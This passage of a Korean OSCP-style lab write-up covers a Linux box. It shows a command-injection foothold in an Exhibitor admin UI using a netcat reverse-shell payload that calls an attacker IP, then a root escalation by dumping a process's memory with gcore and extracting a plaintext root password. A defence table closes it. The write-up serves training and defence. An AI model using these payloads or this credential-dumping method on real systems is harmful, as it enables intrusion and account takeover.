> root        10     2  0 21:27 ?        00:00:00 [rcu_sched]
> root        11     2  0 21:27 ?        00:00:00 [rcu_bh]
> root        12     2  0 21:27 ?        00:00:00 [migration/0]
> root        14     2  0 21:27 ?        00:00:00 [cpuhp/0]
> root        15     2  0 21:27 ?        00:00:00 [kdevtmpfs]
> root        16     2  0 21:27 ?        00:00:00 [netns]
> root        17     2  0 21:27 ?        00:00:00 [kauditd]
> root        18     2  0 21:27 ?        00:00:00 [khungtaskd]
> root        19     2  0 21:27 ?        00:00:00 [oom_reaper]
> root        20     2  0 21:27 ?        00:00:00 [writeback]
> root        21     2  0 21:27 ?        00:00:00 [kcompactd0]
> root        22     2  0 21:27 ?        00:00:00 [ksmd]
> root        23     2  0 21:27 ?        00:00:00 [khugepaged]
> root        24     2  0 21:27 ?        00:00:00 [crypto]
> root        25     2  0 21:27 ?        00:00:00 [kintegrityd]
> root        26     2  0 21:27 ?        00:00:00 [kblockd]
> root        27     2  0 21:27 ?        00:00:00 [edac-poller]
> root        28     2  0 21:27 ?        00:00:00 [devfreq_wq]
> root        29     2  0 21:27 ?        00:00:00 [watchdogd]
> root        30     2  0 21:27 ?        00:00:00 [kswapd0]
> root        48     2  0 21:27 ?        00:00:00 [kthrotld]
> root        49     2  0 21:27 ?        00:00:00 [irq/24-pciehp]
> root        50     2  0 21:27 ?        00:00:00 [irq/25-pciehp]
> root        51     2  0 21:27 ?        00:00:00 [irq/26-pciehp]
> root        52     2  0 21:27 ?        00:00:00 [irq/27-pciehp]
> root        53     2  0 21:27 ?        00:00:00 [irq/28-pciehp]
> root        54     2  0 21:27 ?        00:00:00 [irq/29-pciehp]
> root        55     2  0 21:27 ?        00:00:00 [irq/30-pciehp]
> root        56     2  0 21:27 ?        00:00:00 [irq/31-pciehp]
> root        57     2  0 21:27 ?        00:00:00 [irq/32-pciehp]
> root        58     2  0 21:27 ?        00:00:00 [irq/33-pciehp]
> root        59     2  0 21:27 ?        00:00:00 [irq/34-pciehp]
> root        60     2  0 21:27 ?        00:00:00 [irq/35-pciehp]
> root        61     2  0 21:27 ?        00:00:00 [irq/36-pciehp]
> root        62     2  0 21:27 ?        00:00:00 [irq/37-pciehp]
> root        63     2  0 21:27 ?        00:00:00 [irq/38-pciehp]
> root        64     2  0 21:27 ?        00:00:00 [irq/39-pciehp]
> root        65     2  0 21:27 ?        00:00:00 [irq/40-pciehp]
> root        66     2  0 21:27 ?        00:00:00 [irq/41-pciehp]
> root        67     2  0 21:27 ?        00:00:00 [irq/42-pciehp]
> root        68     2  0 21:27 ?        00:00:00 [irq/43-pciehp]
> root        69     2  0 21:27 ?        00:00:00 [irq/44-pciehp]
> root        70     2  0 21:27 ?        00:00:00 [irq/45-pciehp]
> root        71     2  0 21:27 ?        00:00:00 [irq/46-pciehp]
> root        72     2  0 21:27 ?        00:00:00 [irq/47-pciehp]
> root        73     2  0 21:27 ?        00:00:00 [irq/48-pciehp]
> root        74     2  0 21:27 ?        00:00:00 [irq/49-pciehp]
> root        75     2  0 21:27 ?        00:00:00 [irq/50-pciehp]
> root        76     2  0 21:27 ?        00:00:00 [irq/51-pciehp]
> root        77     2  0 21:27 ?        00:00:00 [irq/52-pciehp]
> root        78     2  0 21:27 ?        00:00:00 [irq/53-pciehp]
> root        79     2  0 21:27 ?        00:00:00 [irq/54-pciehp]
> root        80     2  0 21:27 ?        00:00:00 [irq/55-pciehp]
> root        81     2  0 21:27 ?        00:00:00 [kstrp]
> root       124     2  0 21:27 ?        00:00:00 [scsi_eh_0]
> root       126     2  0 21:27 ?        00:00:00 [scsi_tmf_0]
> root       128     2  0 21:27 ?        00:00:00 [vmw_pvscsi_wq_0]
> root       132     2  0 21:27 ?        00:00:00 [ata_sff]
> root       134     2  0 21:27 ?        00:00:00 [scsi_eh_1]
> root       135     2  0 21:27 ?        00:00:00 [kworker/u2:2-flush-8:0]
> root       136     2  0 21:27 ?        00:00:00 [kworker/0:1H-kblockd]
> root       138     2  0 21:27 ?        00:00:00 [scsi_tmf_1]
> root       140     2  0 21:27 ?        00:00:00 [scsi_eh_2]
> root       141     2  0 21:27 ?        00:00:00 [scsi_tmf_2]
> root       147     2  0 21:27 ?        00:00:00 [ttm_swap]
> root       149     2  0 21:27 ?        00:00:00 [irq/16-vmwgfx]
> root       185     2  0 21:27 ?        00:00:00 [kworker/0:2-events_freezable_power_]
> root       220     2  0 21:27 ?        00:00:00 [kworker/u3:0]
> root       222     2  0 21:27 ?        00:00:00 [jbd2/sda1-8]
> root       223     2  0 21:27 ?        00:00:00 [ext4-rsv-conver]
> root       257     1  0 21:27 ?        00:00:00 /lib/systemd/systemd-journald
> root       280     1  0 21:27 ?        00:00:00 /lib/systemd/systemd-udevd
> root       314     1  0 21:27 ?        00:00:00 /usr/bin/VGAuthService
> root       323     1  0 21:27 ?        00:00:00 /usr/bin/vmtoolsd
> root       443     1  0 21:27 ?        00:00:00 /usr/sbin/cron -f
> root       444     1  0 21:27 ?        00:00:00 /usr/sbin/rsyslogd -n -iNONE
> root       455     1  0 21:27 ?        00:00:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
> root       457     1  0 21:27 ?        00:00:00 /usr/sbin/ModemManager --filter-policy=strict
> root       465     1  0 21:27 ?        00:00:00 /usr/lib/udisks2/udisksd
> root       466     1  0 21:27 ?        00:00:00 /lib/systemd/systemd-logind
> root       469   443  0 21:27 ?        00:00:00 /usr/sbin/CRON -f
> root       487   469  0 21:27 ?        00:00:00 /bin/sh -c while true; do chown -R charles:charles /opt/zookeeper && chown -R charles:charles /opt/exhibitor && sleep 1; done
> avahi      504   464  0 21:27 ?        00:00:00 avahi-daemon: chroot helper
> root       512     1  0 21:27 ?        00:00:00 /usr/lib/policykit-1/polkitd --no-debug
> root       513     1  0 21:27 ?        00:00:00 /usr/bin/password-store
> root       514     1  0 21:27 ?        00:00:00 /usr/sbin/cups-browsed
> root       554     1  0 21:27 ?        00:00:00 /usr/sbin/lightdm
> root       557     1  0 21:27 ?        00:00:00 /usr/sbin/sshd -D
> root       581     1  0 21:27 tty1     00:00:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
> root       582   554  0 21:27 tty7     00:00:00 /usr/lib/xorg/Xorg :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
> root       584     1  0 21:27 ?        00:00:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
> root       636     1  0 21:27 ?        00:00:00 /usr/sbin/cupsd -l
> root       657   554  0 21:27 ?        00:00:00 lightdm --session-child 18 21
> root       720   554  0 21:27 ?        00:00:00 lightdm --session-child 14 21
> root      1322     1  0 21:29 ?        00:00:00 /usr/sbin/smbd --foreground --no-process-group
> root      1324  1322  0 21:29 ?        00:00:00 /usr/sbin/smbd --foreground --no-process-group
> root      1325  1322  0 21:29 ?        00:00:00 /usr/sbin/smbd --foreground --no-process-group
> root      1327  1322  0 21:29 ?        00:00:00 /usr/sbin/smbd --foreground --no-process-group
> root      1618     1  0 21:29 ?        00:00:00 /usr/sbin/NetworkManager --no-daemon
> root      8310     2  0 21:53 ?        00:00:00 [kworker/0:0-ata_sff]
> root      9706     2  0 21:58 ?        00:00:00 [kworker/0:1-ata_sff]
> charles  10397     1  4 22:00 ?        00:00:00 java -Dzookeeper.log.dir=. -Dzookeeper.root.logger=INFO,CONSOLE -cp /opt/zookeeper/bin/../build/classes:/opt/zookeeper/bin/../build/lib/*.jar:/opt/zookeeper/bin/../lib/slf4j-log4j12-1.6.1.jar:/opt/zookeeper/bin/../lib/slf4j-api-1.6.1.jar:/opt/zookeeper/bin/../lib/netty-3.7.0.Final.jar:/opt/zookeeper/bin/../lib/log4j-1.2.16.jar:/opt/zookeeper/bin/../lib/jline-0.9.94.jar:/opt/zookeeper/bin/../zookeeper-3.4.6.jar:/opt/zookeeper/bin/../src/java/lib/*.jar:/opt/zookeeper/bin/../conf: -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.local.only=false org.apache.zookeeper.server.quorum.QuorumPeerMain /opt/zookeeper/bin/../conf/zoo.cfg
> root     10470   487  0 22:00 ?        00:00:00 sleep 1
> charles  10472 10363  0 22:00 ?        00:00:00 grep -i root
> ```

> [!tip] `ps -ef`의 노이즈를 걷어내는 필터
> 대괄호로 감싸인 이름은 전부 커널 스레드다. 한 줄로 지운다:
> ```bash
> ps -eo user,pid,ppid,cmd --sort=user | grep -v '\['
> ps -ef --forest                      # 부모-자식 관계로 보기 (cron → sh 루프가 한눈에)
> ```
> `--forest`가 특히 유용하다 — 위 출력에서 `443 cron → 469 CRON → 487 sh -c while true` 계보가 바로 보인다.

**표적은 PID 513, `/usr/bin/password-store`.** 이름이 전부를 말한다.

> [!warning] `chown -R` 루프(PID 487)는 권한상승 경로가 아니었다
> root가 1초마다 `/opt/zookeeper`·`/opt/exhibitor`를 `chown -R` 한다. "root가 내가 쓰는 디렉터리를 만진다"는 것은 매력적인 신호지만:
> - GNU `chown -R`은 기본적으로 심볼릭 링크를 따라가지 않는다(`-R`만 주면 `-P`로 동작한다). `-L`/`-H`가 있어야 따라간다
> - 이 루프는 소유권을 `charles`로 바꾸는 것이지 root로 바꾸는 것이 아니다
>
> 이 경로는 시도하지 않았다 — `gcore` 쪽이 확실하고 짧았다. 다만 "root가 반복 실행하는 명령"을 발견하면 항상 검토 대상에 넣는다는 원칙 자체는 유효하다. [가정]

### 4-3. 코어 덤프

```bash
sudo gcore 513
0x00007f971bd1c6f4 in __GI___nanosleep (requested_time=requested_time@entry=0x7ffc3d7a2c80, remaining=remaining@entry=0x7ffc3d7a2c80) at ../sysdeps/unix/sysv/linux/nanosleep.c:28
Saved corefile core.513
[Inferior 1 (process 513) detached]
```

출력 세 줄을 원리와 짝지어 읽는다:

| 출력 | 의미 |
|---|---|
| `in __GI___nanosleep (…)` | 덤프 시점에 프로세스가 `nanosleep`에 멈춰 있었다. `password-store`는 무한 sleep 루프다 — 즉 아무 일도 안 하면서 패스워드만 들고 있는 프로세스다 |
| `Saved corefile core.513` | 현재 디렉터리에 `core.513` 생성 |
| `[Inferior 1 (process 513) detached]` | ptrace 분리 완료. 대상 프로세스는 죽지 않았다 (중요 — 죽였으면 흔적이 크게 남는다) |

> [!danger] `gcore`가 대상 프로세스를 일시 정지시킨다는 사실을 기억하라
> 덤프하는 동안 대상은 멈춘다. 큰 프로세스면 수 초~수십 초다.
> 운영 환경이라면 서비스 중단이고, 시험 랩이라도 핵심 서비스를 덤프하면 박스가 불안정해질 수 있다. 표적을 고를 때 크기와 중요도를 함께 본다.

### 4-4. `strings`로 자격증명 추출

```bash
strings core.513
```

핵심은 이 두 줄이다:

```
001 Password: root:
ClogKingpinInning731
```

같은 덤프에 **환경변수와 커널 버전**도 그대로 찍혀 있다 — 코어 덤프가 무엇을 노출하는지 보여주는 좋은 예다:

```
/usr/bin/password-store
HOME=/root
LOGNAME=root
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/root
...
Linux
4.19.0-10-amd64
```

> [!note]- `strings core.513` 전체 원문 (접힘)
> ```bash
> strings core.513
> CORE
> password-store
> /usr/bin/password-store
> CORE
> x,z=
> CORE
> /usr/bin/passwor
> ////////////////
> LINUX
> /usr/bin/passwor
> ////////////////
> IGISCORE
> CORE
> ELIFCORE
> /usr/bin/password-store
> /usr/bin/password-store
> /usr/lib/x86_64-linux-gnu/libc-2.28.so
> /usr/lib/x86_64-linux-gnu/libc-2.28.so
> /usr/lib/x86_64-linux-gnu/ld-2.28.so
> /usr/lib/x86_64-linux-gnu/ld-2.28.so
> fork failed!
> /tmp
> ;*3$"
> aliases
> ethers
> group
> gshadow
> hosts
> initgroups
> netgroup
> networks
> passwd
> protocols
> publickey
> services
> shadow
> CAk[S
> N?z=
> E?z=
> libc.so.6
> /lib/x86_64-linux-gnu
> libc.so.6
> P-z=
> ;*3$"
> P.z=
> sse2
> x86_64
> avx512_1
> i586
> i686
> haswell
> xeon_phi
> linux-vdso.so.1
> tls/x86_64/x86_64/tls/x86_64/
> /lib/x86_64-linux-gnu/libc.so.6
> P z=
> 8!z=
> P z=
> P z=
> p&z=
> p&z=
> p&z=
> @&z=
> h''z=
> 0+z=
>  +z=
>  +z=
> @(z=
> (+z=
> /usr/bin/passwor
> ////////////////
> /usr/bin/passwor
> ////////////////
> ////////////////
> `,z=
> @-z=
> @-z=
> u##;
>  -z=
> 001 Password: root:
> ClogKingpinInning731
> E?z=
> ]?z=
> h?z=
> u?z=
> x86_64
> /usr/bin/password-store
> HOME=/root
> LOGNAME=root
> PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
> LANG=en_US.UTF-8
> SHELL=/bin/sh
> PWD=/root
> /usr/bin/password-store
> bemX
> __vdso_clock_gettime
> __vdso_gettimeofday
> __vdso_time
> __vdso_getcpu
> linux-vdso.so.1
> LINUX_2.6
> Linux
> Linux
> 4.19.0-10-amd64
> AVAUATSH
> [A\A]A^]
> D9+u
> [A\A]A^]
> D9#u
> H+=x
> H#=y
> H+=K
> H#=L
> AVAUATI
> [A\A]A^]
> GCC: (Debian 8.3.0-6) 8.3.0
> .shstrtab
> .gnu.hash
> .dynsym
> .dynstr
> .gnu.version
> .gnu.version_d
> .dynamic
> .rodata
> .note
> .eh_frame_hdr
> .eh_frame
> .text
> .altinstructions
> .altinstr_replacement
> .comment
> .shstrtab
> note0
> load
> ```

![[Pasted image 20260615110647.png]]

> [!tip] `strings` 출력이 수천 줄이면 — 이렇게 좁힌다
> 이 박스는 130줄이라 눈으로 읽었지만, JVM을 덤프하면 수십만 줄이 나온다:
> ```bash
> strings core.513 | grep -i -E 'passw|pwd|secret|token|key|cred|login'
> strings -n 12 core.513 | grep -v '^[/.]'          # 12자 이상, 경로 제외
> strings -e l core.513 | grep -i passw              # UTF-16LE (Windows 덤프에서 필수)
> strings core.513 | grep -A2 -B2 'Password'         # 앞뒤 문맥 함께
> ```
> `-e l`을 기억하라 — Windows 프로세스 문자열은 UTF-16LE라 기본 `strings`가 못 잡는다.

> [!warning] `001 Password: root:` 와 값이 다른 줄에 있다
> `strings`는 널 종료 문자열 단위로 끊는다. 즉 라벨과 값이 서로 다른 문자열 객체면 줄이 갈라진다.
> `grep passw`만 하면 라벨만 잡히고 정작 패스워드는 안 나온다. 위의 `-A2 -B2`(앞뒤 문맥)가 그래서 필요하다. 이걸 모르면 "덤프에 패스워드가 없다"고 오판한다.

### 4-5. root

```bash
su
ClogKingpinInning731
whoami
root
cd /root
cat proof.txt
3da5b5076fd3f0523b94859c757d46f0
```

> [!tip] `su` 대신 SSH가 더 안정적이다 — 22와 2222가 열려 있다
> 패스워드를 얻었으면 끊기지 않는 세션으로 갈아타는 것이 낫다:
> ```bash
> ssh root@192.168.115.98            # 22
> ssh -p 2222 root@192.168.115.98    # 2222 (같은 호스트키 → 동일 sshd로 보인다)
> ```
> 단 `PermitRootLogin` 설정에 따라 거부될 수 있다 — 이 박스에서는 시도하지 않았다 [가정]. 거부되면 `ssh charles@…` 로 붙어 정상 TTY에서 `su`를 한다. 어느 쪽이든 `nc` 셸보다 안정적이다.

22와 2222의 호스트키는 완전히 같다 — nmap 출력에서 두 포트의 RSA/ECDSA/ED25519 지문이 세 개 다 동일하다. 즉 같은 sshd 인스턴스가 두 포트를 리슨하고 있거나 동일 키를 공유하는 구성이다. 별개 서비스로 착각해 두 번 공략하지 마라 — 시간 낭비다.

---

## 5. 플래그

| 플래그 | 위치 | 값 |
|---|---|---|
| `local.txt` | `/home/charles/local.txt` (표준 위치) | 원본 기록에 텍스트로 남아 있지 않다 — 스크린샷에만 존재 |
| `proof.txt` | `/root/proof.txt` | `3da5b5076fd3f0523b94859c757d46f0` |

![[Pasted image 20260615104827.png]]

![[Pasted image 20260615110738.png]]

> [!danger] 시험 증거 형식 — 플래그만 찍으면 인정 안 된다
> `whoami`·`hostname`·`ip a`와 플래그가 한 화면에 있어야 한다:
> ```bash
> cat /root/proof.txt; echo "---"; whoami; hostname; ip a | grep 'inet '; date
> ```

> [!warning] `local.txt` 값을 텍스트로 남기지 않은 것이 이 노트의 실수다
> 스크린샷은 검색도 복사도 안 된다. [[_WRITEUP-STANDARD]]가 "터미널 출력은 캡처하지 않는다"고 못박은 이유다.
> 값을 지어내지 않고 누락으로 기록한다.

---

## 6. 막혔던 지점 / 시행착오

이 박스는 **37분**에 끝났다 — 그래서 오히려 기록할 것이 있다. 산출물·스크린샷 타임스탬프가 남긴 실제 흐름은 이렇다: `10:30` nmap 시작 → `10:31` 종료 → `10:40` Exhibitor UI 접근 → `10:41` 익스플로잇 검색 → `10:46` 페이로드 확보·주입 → `10:48` RCE + 로컬 플래그 → `11:06` `strings` → `11:07` root.

가장 긴 구간은 `10:31 → 10:40`, 즉 "이게 무슨 제품인지 알아내는 9분"이었다. 그리고 `10:48 → 11:06`의 18분이 권한상승 열거다. 막힘이 적었던 이유는 실력이 아니라 nmap이 진입 URL을 통째로 줬기 때문이다. 그 줄이 없었다면 어디서 막혔을지를 아래에 적는다.

### ① 8080만 보고 "404, 끝"으로 판단할 뻔했다 — 이 박스 최대의 함정

```
8080/tcp  open  http        Jetty 1.0
|_http-server-header: Jetty(1.0)
|_http-title: Error 404 Not Found
```

브라우저로 `http://192.168.115.98:8080/` 을 열면 **Jetty 404 페이지**뿐이다. 여기서 "빈 서버"로 판단하면 박스가 막힌다.

**무엇이 구했나** — 바로 다음 줄이다:

```
8081/tcp  open  http        nginx 1.14.2
|_http-title: Did not follow redirect to http://192.168.115.98:8080/exhibitor/v1/ui/index.html
```

nmap의 `http-title` NSE는 리다이렉트를 따라가지 않고 **목적지 URL을 제목 자리에 그대로 출력한다.** 그 URL에 `/exhibitor/`가 들어 있었다.

> [!danger] 일반화 — `Did not follow redirect to` 는 nmap이 주는 최고의 힌트 중 하나다
> 이 문자열을 보면 반드시 그 URL을 직접 연다. 리다이렉트 목적지에는 종종 이런 것들이 들어 있다:
> - 경로(이 박스: `/exhibitor/v1/ui/index.html`) — 디렉터리 열거로는 못 찾을 수 있는 깊은 경로
> - 호스트명/도메인 — `/etc/hosts`에 추가해야 하는 vhost
> - 다른 포트 — 이 박스처럼 8081 → 8080
>
> 그리고 404 페이지를 만나면 루트가 아니라 경로를 찾아라:
> ```bash
> curl -sI http://192.168.115.98:8081/                     # 리다이렉트 확인
> curl -s  http://192.168.115.98:8080/exhibitor/v1/ui/index.html | head
> feroxbuster -u http://192.168.115.98:8080/ -w …          # 경로 열거
> ```

### ② 생소한 제품 앞에서 9분

`zookeeper`·`Exhibitor`는 OSCP 준비 과정에서 거의 안 나오는 이름이다. `10:31 → 10:40`이 그 시간이었다.

**교훈** — 이 9분은 **낭비가 아니라 필수 투자**다. 제품을 오인하면 그 뒤 전부가 헛수고다. 다만 **효율을 높이는 순서**는 있다(1-2):
1. 제품 공식 문서에서 **"관리 UI가 있는가"** 부터 본다
2. `searchsploit <제품명>` · `<제품명> unauthenticated RCE` 검색
3. **버전을 붙여서** 검색 — `Exhibitor 1.7.1` 처럼

> [!warning] 손절 기준 — "제품 식별에 15분"
> 15분 안에 제품과 공격면이 안 나오면 다른 포트로 옮겼다가 돌아온다. 이 박스에는 CUPS·Samba·JMX·SSH가 더 있었다.
> 한 서비스에 매몰되는 것이 24시간 시험에서 가장 흔한 실패 형태다.

### ③ `nc -e` 가 통한 것은 운이었다

페이로드 `$(/bin/nc -e /bin/sh 192.168.45.179 4444 &)` 는 **타겟에 `netcat-traditional`이 있어야** 동작한다. 데비안 기본은 `netcat-openbsd`이고 거기엔 **`-e`가 없다.**

**만약 실패했다면** 증상이 헷갈린다 — Commit은 성공하고 UI는 정상인데 **리스너에 아무것도 안 온다.** "페이로드가 실행 안 됐나?" 로 새기 쉽다.

**구분법과 대안은 2-4의 danger 콜아웃에 정리했다.** 요약하면:
- `tcpdump -i tun0 'tcp port 4444'` 로 **패킷이 오는지부터** 본다
- 안 오면 `mkfifo` 방식으로 교체
- 그래도 안 오면 포트를 **80/443**으로 바꾼다

### ④ `su`는 TTY를 요구한다 — `nc` 셸에서는 실패한다

원본 기록은 `su` → 패스워드 → `whoami` → `root` 로 이어진다. **그런데 `nc -e /bin/sh` 로 얻은 셸은 TTY가 아니고, `su`는 TTY 없이는 `su: must be run from a terminal` 로 거부한다.**

즉 그 시점에는 이미 TTY 업그레이드가 되어 있었다는 뜻이다. [가정 — 원본 기록에 업그레이드 명령이 남아 있지 않아 확정할 수 없다. 재현하지 않은 명령을 실측처럼 적지 않는다.]

**같은 상황을 다시 만나면 순서는 이렇다:**

```bash
# 1) 셸을 잡자마자 TTY 업그레이드 (su/sudo 전에 반드시)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → Enter 두 번 → export TERM=xterm

# 2) python이 없을 때
script -qc /bin/bash /dev/null

# 3) TTY가 도저히 안 되면 — su를 우회한다
echo 'ClogKingpinInning731' | su -c 'id' root     # 대부분의 su는 이것도 거부한다
sshpass -p 'ClogKingpinInning731' ssh root@TARGET # 칼리에서 SSH로 붙는 것이 정답
```

> [!danger] TTY가 없을 때 실패하는 것들 — 목록으로 외워라
> `su` · `sudo`(패스워드 요구 시) · `ssh`(패스워드 프롬프트) · `passwd` · `vi`/`vim`/`nano` · `top` · `less`/`man` · `gpg` · `mysql -p`
> 공통점: 패스워드를 프롬프트로 받거나 화면을 그리는 것. 이 중 하나가 필요해지는 순간이 곧 TTY 업그레이드 시점이다.

### ⑤ 버린 경로 (1) — JMX (39605/tcp)

`ps -ef`가 밝혀준 사실:

```
-Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.local.only=false
```

`-Dcom.sun.management.jmxremote.authenticate=false` 나 `ssl=false` 가 명령줄에 **명시돼 있지는 않다.** 따라서 인증 여부는 **확인되지 않았다** — nmap이 `java-rmi`로만 식별했고 더 파지 않았다.

**성립했다면 이런 경로였다** [가정 — 시도하지 않았다]:

```bash
nmap -sV --script=rmi-dumpregistry -p 39605 192.168.115.98   # RMI 레지스트리 열거
# MLet 기반 원격 MBean 로드 → 임의 코드 실행 (mjet / sjet 계열 도구)
```

**왜 안 갔나** — Exhibitor 경로가 이미 셸을 줬다. **성공한 경로가 있으면 옆길을 파지 않는다.** 다만 시험이라면 **첫 경로가 막혔을 때의 2순위**로 반드시 적어 둔다.

### ⑥ 버린 경로 (2) — CUPS 631 / Samba 445

```
631/tcp   open  ipp   CUPS 2.2
|_http-title: Forbidden - CUPS v2.2.10
| http-methods:
|_  Potentially risky methods: PUT
```

**미끼로 보이지만 확인은 안 했다.** 정직하게 남긴다:

| 서비스 | 신호 | 확인했어야 할 것 |
|---|---|---|
| CUPS 2.2.10 (631) | `Potentially risky methods: PUT` · 웹 관리 UI 존재 | `curl -i -X OPTIONS http://…:631/` · `/admin` 접근 · 프린터 추가 권한. CUPS는 관리 인터페이스로 명령 실행에 이르는 경로가 알려져 있다 |
| Samba 4.9.5 (139/445) | `account_used: guest` — 게스트 접근이 성립했다 | `smbclient -L //192.168.115.98/ -N` · `smbmap -H 192.168.115.98 -u guest` — 공유 열거는 30초짜리 작업이다. 안 한 것은 실수다 |

> [!warning] `smb-security-mode: account_used: guest` 는 흘려보내면 안 되는 줄이다
> nmap이 게스트로 인증에 성공했다는 뜻이다. 공유 목록·읽기 가능한 파일이 있을 수 있다.
> SMB가 열려 있으면 무조건 다음 두 줄을 친다:
> ```bash
> smbclient -L //192.168.115.98/ -N
> smbmap -H 192.168.115.98 -u '' -p ''
> ```

### ⑦ 이 유형에서 흔히 막히는 지점 (원문에 실측 기록이 없어 구분해 적는다)

아래는 **이 박스에서 실제로 겪은 기록이 없다.** 같은 유형에서 자주 나오는 함정이라 별도로 표시한다:

- **Commit을 눌러도 실행이 안 된다** — 설정이 저장만 되고 **ZooKeeper 재기동이 안 일어난** 경우다. UI에서 Restart를 명시적으로 누르거나, 기존 ZooKeeper 프로세스가 죽기를 기다려야 한다
- **필드에 넣은 문자열이 UI에서 이스케이프된다** — 브라우저가 아니라 **API에 직접 POST**하면 우회된다
- **`gcore` 대신 `gdb`만 있는 경우** — `sudo gdb -p 513 -batch -ex 'gcore /tmp/c'` 로 동일한 일을 한다
- **코어 파일이 안 만들어진다** — `ulimit -c`가 0이면 커널 덤프는 막히지만 **`gcore`는 영향받지 않는다**(gdb가 직접 쓴다). 실패했다면 원인은 **디렉터리 쓰기 권한**일 가능성이 높다

---

## 7. OSCP 시험 관점 — 이 상황을 다시 만나면 무엇을 먼저 치는가

1. **`-p-` 전수 스캔은 타협하지 않는다.** 이 박스의 진입점(8081)과 2순위 경로(39605)가 둘 다 top-1000 밖이다
2. **nmap 출력에서 `Did not follow redirect to` 를 찾는다.** 진입 URL이 통째로 적혀 있을 수 있다
3. **404 페이지를 "빈 서버"로 판정하지 않는다.** 경로를 모르는 것뿐이다 — 리다이렉트·디렉터리 열거·제품 기본 경로를 확인한다
4. **모르는 제품이 나오면 "관리 UI가 별도로 있는가"를 먼저 검색한다.** ZooKeeper→Exhibitor, Kafka→Kafdrop, Redis→RedisInsight, Hadoop→YARN UI
5. **관리 UI가 로그인 없이 열리면 정상 기능부터 훑는다.** 설정 편집 · 스크립트 실행 · 백업 복원 · "custom command" 필드
6. **설정 필드에 `$(id)` 를 넣어 본다.** 응답이나 로그에 `uid=`가 보이면 명령 주입이다. 파괴적이지 않은 탐침을 먼저 쓴다
7. **리버스셸 페이로드는 `nc -e` → `mkfifo` → `bash /dev/tcp` 순으로 시도한다.** 안 붙으면 포트를 80/443으로 바꾼다
8. **셸을 잡으면 즉시 TTY 업그레이드.** `su`·`sudo`가 필요해지기 전에 해둔다
9. **셸을 잡자마자 5개를 친다.** `id` · `sudo -l` · `find / -perm -4000 -type f 2>/dev/null` · `getcap -r / 2>/dev/null` · `cat /etc/crontab`
10. **`sudo -l`은 4가지 질문으로 번역한다.** 셸을 주는가 / 쓰는가 / 읽는가 / 다른 프로그램을 실행하는가. `gcore`는 "읽는가"에 해당하고, 그것으로 충분하다
11. **`ps -ef --forest | grep -v '\['` 로 커스텀 root 프로세스를 찾는다.** 배포판에 없는 이름이 보이면 `dpkg -S`로 확인한다
12. **메모리 덤프에서 크리덴셜을 찾을 때는 문맥까지 본다.** `grep -A2 -B2 -i passw`. 라벨과 값이 다른 줄에 있을 수 있다
13. **성공한 경로가 있으면 옆길을 파지 않는다.** JMX·CUPS·SMB는 1순위가 막혔을 때의 대안으로만 적어 둔다
14. **시간 배분** — 이 박스의 실제 배분: 정찰·제품 식별 10분 · foothold 17분 · 권한상승 19분. 합계 37분. 손절선은 "제품 식별 15분, 한 경로당 30분"

> [!tip] 자동 도구 없이 같은 결과를 얻는 방법 (시험 대비)
> | 썼던 것 | 시험 가능 여부 | 수동 대안 |
> |---|---|---|
> | `nmap -sCV -A -p-` | ✅ 허용 | — |
> | Exhibitor UI 조작 | ✅ 애초에 수동이다 | 개발자도구로 Commit 요청을 복사해 `curl`로 재생 |
> | `nc -lvnp` / `nc -e` | ✅ 허용 | `mkfifo` · `bash /dev/tcp` (2-4) |
> | `sudo gcore` + `strings` | ✅ 허용 (시스템 기본 도구) | `sudo gdb -p PID -batch -ex 'gcore /tmp/c'` |
> | metasploit | ⚠️ 1대 한정 | 이 박스는 metasploit이 전혀 필요 없다. 그 1회를 다른 박스에 아껴라 |
>
> 결과적으로 이 박스는 자동 익스플로잇 도구를 하나도 쓰지 않고 풀렸다. 시험 재현성 100%.

---

## 8. 방어 관점

| 문제 | 조치 |
|---|---|
| **Exhibitor UI가 인증 없이 인터넷/내부망에 노출** | 근본 원인. Exhibitor에는 인증 기능이 없다. 리버스 프록시(nginx) 앞단에 인증을 걸거나, 관리망에만 바인딩한다. 1.7.0 이상은 리슨 인터페이스 지정이 가능하므로 `127.0.0.1`로 묶고 SSH 터널로만 접근한다 |
| **CVE-2019-5029 — 패치가 존재하지 않는다** | soabase/exhibitor는 아카이브 상태이고 마지막 릴리스 1.7.1이 영향 범위 안이다. 업그레이드가 조치가 될 수 없다. 대체 제품으로 이전하거나 UI를 완전히 차단한다 |
| 8081 nginx가 Exhibitor로 리다이렉트 | 프록시가 있다면 거기가 인증을 걸 자리다. 지금은 오히려 진입점을 광고하는 역할을 한다 |
| **`java.env script` 같은 필드를 사용자 입력으로 받음** | 설계상 셸에서 평가되는 필드는 관리자 전용 + 감사 로그 + 변경 승인이 붙어야 한다 |
| **`charles`에게 `NOPASSWD: /usr/bin/gcore`** | 제거한다. 디버깅 권한은 root와 사실상 동등하다. 꼭 필요하면 대상 PID를 특정한 래퍼 스크립트만 허용하고, `NOPASSWD`를 빼서 패스워드를 요구한다 |
| **root 프로세스가 평문 패스워드를 메모리에 상주** | `/usr/bin/password-store`의 설계 자체가 문제다. 비밀은 필요할 때만 메모리에 올리고 즉시 `explicit_bzero()`로 지운다. 상시 상주는 금지 |
| ptrace 무제한 | `kernel.yama.ptrace_scope=2`(관리자만) 또는 `3`(완전 차단)로 설정. 단 `sudo gcore`는 root 권한이라 이것만으로는 못 막는다 — sudo 정책 수정이 우선이다 |
| **ZooKeeper JMX가 인증·TLS 없이 원격 노출**(`jmxremote.local.only=false`) | `com.sun.management.jmxremote.authenticate=true` + `ssl=true` 설정, 또는 `local.only=true`로 되돌린다. JMX는 그 자체가 원격 코드 실행 인터페이스다 |
| **ZooKeeper 3.4.6 (2014년 빌드)** | 지원 브랜치로 업그레이드. 3.4.x는 오래전에 EOL이다. 4자 명령(`envi` 등)도 화이트리스트로 제한한다 |
| SMB 게스트 접근 허용 | `smb.conf`에 `map to guest = never`, 불필요하면 Samba 중지 |
